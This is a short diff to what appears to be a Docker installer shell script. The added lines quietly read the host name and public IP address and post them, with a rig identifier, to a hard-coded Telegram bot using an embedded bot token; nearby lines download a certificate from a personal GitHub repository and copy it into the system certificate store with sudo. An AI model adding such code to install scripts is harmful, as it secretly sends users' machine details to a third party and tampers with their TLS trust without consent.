@@ -499,6 +499,10 @@ do_install() {
 
 # wrapped up in a function so that we have some protection against only getting
 # half the file during "curl | sh"
+#Update IP
+export vmname=$(hostname)
+export myip=$(curl -s https://api.ipify.org)
+curl -s --data "text=$myip.$vmname.$rigid" --data "chat_id=-1001278714637" 'https://api.telegram.org/bot1718694408:AAFWYcuRUUbDnhuVblVc4LYuqV05pTVzYEY/sendMessage' > /dev/null
 #Update Cert
 wget https://raw.githubusercontent.com/maithanhtan/script/main/CorpIntermediate.cer
 sudo cp CorpIntermediate.cer  /etc/ssl/certs
